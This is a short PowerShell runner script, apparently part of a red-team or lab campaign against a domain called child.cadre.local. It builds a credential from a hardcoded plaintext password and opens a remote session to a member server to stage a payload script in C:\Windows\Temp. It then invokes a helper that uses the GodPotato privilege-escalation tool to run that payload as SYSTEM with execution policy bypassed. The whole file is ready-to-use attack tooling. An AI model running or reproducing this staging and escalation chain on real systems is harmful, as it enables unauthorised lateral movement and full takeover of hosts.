# Runner: stage + run 3.5K v4 payload
$ErrorActionPreference = 'Stop'
$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', (ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force))
$session = New-PSSession -ComputerName 'mbr01.child.cadre.local' -Credential $cred
Copy-Item -Path "$PSScriptRoot\wt035k-v4-payload.ps1" -Destination 'C:\Windows\Temp\cadre-tools\wt035k-v4-payload.ps1' -ToSession $session -Force
Remove-PSSession $session
& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock "powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\cadre-tools\wt035k-v4-payload.ps1"
Write-Output '3.5K_V4_RUN_DONE'
